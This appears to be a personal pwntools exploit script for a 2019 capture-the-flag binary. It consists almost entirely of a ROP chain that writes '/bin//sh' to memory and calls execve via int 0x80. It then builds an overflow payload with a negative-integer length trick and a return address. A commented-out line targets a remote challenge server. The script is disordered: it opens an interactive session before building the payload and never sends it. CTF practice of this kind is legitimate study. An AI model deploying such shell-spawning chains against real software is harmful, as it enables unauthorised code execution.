from struct import pack
import pwn
pwn.context(arch = 'i386', os = 'linux', log_level = 'debug')

p = ''
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b0040) # @ .data
p += pack('<I', 0x00023f97) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0006b34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b0044) # @ .data + 4
p += pack('<I', 0x00023f97) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0006b34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b0048) # @ .data + 8
p += pack('<I', 0x0002c5fc) # xor eax, eax ; ret
p += pack('<I', 0x0006b34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x00018395) # pop ebx ; ret
p += pack('<I', 0x001b0040) # @ .data
p += pack('<I', 0x000b4047) # pop ecx ; ret
p += pack('<I', 0x001b0048) # @ .data + 8
p += pack('<I', 0x00001aa6) # pop edx ; ret
p += pack('<I', 0x001b0048) # @ .data + 8
p += pack('<I', 0x0002c5fc) # xor eax, eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00007eec) # inc eax ; ret
p += pack('<I', 0x00002c87) # int 0x80


# io = pwn.remote('116.85.48.105', 5005)
io = pwn.process('/home/zander/Desktop/ctf/ddctf2019/misc/xpwn')

io.recvuntil('Enter username: ')
io.sendline()
io.readline()
io.recvuntil('Please set the length of password: ')
io.sendline()
io.readline()
io.recvuntil('): ')
io.sendline()
io.readline()

io.interactive()
io.close()

p1 = 'a' * 64
p2 = '-2147483648' + 'a' * (16 - len('-2147483648'))
p3 = 'a' * 16 * 4 + 'aaaa' + pwn.p32(0x080483fa)
payload = p1 + p2 + p3 + p